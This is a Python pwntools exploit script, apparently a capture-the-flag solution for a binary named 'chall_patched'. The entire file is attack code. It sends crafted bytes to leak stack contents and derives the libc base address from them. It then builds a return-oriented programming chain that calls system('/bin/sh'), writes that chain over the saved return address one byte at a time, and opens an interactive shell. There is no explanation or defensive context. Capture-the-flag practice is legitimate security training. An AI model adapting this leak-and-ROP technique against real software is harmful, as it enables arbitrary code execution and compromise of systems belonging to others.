from pwn import *
import itertools

#r = gdb.debug("./chall_patched", gdbscript="""break *sort+623""")
r=process("./chall_patched")
context.binary = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

r.send(b'\xf1'+bytes([0x18]*(256-(0xbc-0xa5))))
d = b''
try:
    while tmp:= r.recv(timeout=1): d+=tmp
except: pass

def grouper(n, iterable):
    args = [iter(iterable)] * n
    return zip(*args)

stack = bytearray([d.count(bytes([i])) for i in range(256)])
stackG = list(grouper(8, stack))
print([bytes(i).hex() for i in (stackG)])
libc.address = int.from_bytes(bytes(stackG[5]), 'little') - libc.sym['__libc_start_call_main'] - 122
saved_rip = bytes(stack[40:])
print(hex(libc.address))
print(saved_rip)
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))
rop.system(next(libc.search(b'/bin/sh\0')))

target = rop.chain()

payload = b''
print(target)

for i, t, s in zip(range(len(target)), target, saved_rip):
    print(i, 32)
    r.send(b'\xf1'+bytes([0x18]*(256-(0xbc-0xa5)))+bytes([0x28+i]*((t-s)%256)))
    sleep(0.2)
    while tmp:= r.recv(timeout=0.2): pass

r.send(b'\xf1') # break the loop
while tmp:= r.recv(timeout=1): d+=tmp

r.interactive()
